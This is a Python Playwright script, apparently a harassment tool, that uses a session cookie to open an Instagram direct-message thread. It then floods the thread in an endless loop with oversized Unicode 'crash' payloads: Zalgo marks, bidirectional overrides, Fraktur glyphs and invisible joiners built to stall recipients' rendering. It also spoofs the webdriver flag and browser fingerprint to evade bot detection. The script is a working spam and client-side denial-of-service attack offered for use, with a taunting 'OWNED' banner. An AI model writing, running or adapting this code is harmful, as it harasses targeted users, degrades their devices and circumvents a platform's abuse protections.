# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (ATOMIC-BLOCK-V4)
# 📅 STATUS: UI-LOCK | 2-MPS | DOCKER-READY

import os, asyncio, random, sys
from playwright.async_api import async_playwright

# --- CONFIGURATION ---
STRIKE_LIMIT = 15  # Refreshes even faster to maintain peak CPU pressure
# ---------------------

def get_kernel_stop_payload():
    """Generates an unbreakable atomic block for maximum rendering stress."""
    u_id = random.randint(1000, 9999)
    # Invisible connectors to force the browser to treat the string as one 'word'
    glue = "\u2060" 
    
    # 💥 THE ATOMIC HEADER
    header = f"👑_ＰＲＡＶＥＥＲ_ＰＡＰＡ_👑{glue}⚠️_SYSTEM_ERROR:_TEAM_DEVEL_HAS_BEEN_OWNED_⚠️{glue}🆔_{u_id}{glue}"
    
    # 🏗️ THE 'VOID' BLOCK (Ultra-Dense Zalgo + Mathematical Fraktur)
    # We remove all spaces. This forces the layout engine to work 10x harder.
    z_tower = "̸" * 160 
    # Braille Pattern Blank (U+2800) is used to create 'invisible' physical width
    void_fill = "\u2800" * 20
    
    body_elements = []
    for i in range(120):
        # Bi-Directional Overrides INSIDE the block
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        # Mathematical Bold Fraktur for font-fallback exhaustion
        body_elements.append(f"{prefix}𝕻𝕬𝕻𝕬_𝕺𝕹_𝕿𝕺𝕻_{void_fill}{z_tower}")
        
    # Join everything with no spaces to create one massive atomic block
    return (header + glue.join(body_elements))[:9980]

async def agent_blitz(target_id, cookie):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True, 
            args=["--disable-blink-features=AutomationControlled", "--no-sandbox", "--disable-setuid-sandbox"]
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        
        page = await context.new_page()
        strike_count = 0

        async def sync_chat():
            print(f"📡 [SYNC] Resetting Atomic Socket...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            box = page.get_by_role("textbox", name="Message")
            await box.wait_for(state="visible", timeout=60000)
            return box

        try:
            box = await sync_chat()

            while True:
                # 🚀 2-MPS Aggressive Burst
                for _ in range(2):
                    payload = get_kernel_stop_payload()
                    # Using fill() ensures the entire atomic block is injected at once
                    await box.fill(payload)
                    await page.keyboard.press("Enter")
                    strike_count += 1
                    print(f"💀 [STRIKE {strike_count}] ATOMIC BLOCK INJECTED", flush=True)
                    # Reduced delay for higher aggression
                    await asyncio.sleep(0.02) 
                
                await asyncio.sleep(0.7)

                # 🛠️ SHADOW-BYPASS REFRESH
                if strike_count >= STRIKE_LIMIT:
                    print(f"🧊 [COOLING] Purging RAM & Resetting DOM...")
                    strike_count = 0
                    box = await sync_chat()
                    await asyncio.sleep(1)

        except Exception as e:
            print(f"❌ Error: {str(e)[:100]}")
            await browser.close()

if __name__ == "__main__":
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    asyncio.run(agent_blitz(target_id, cookie))
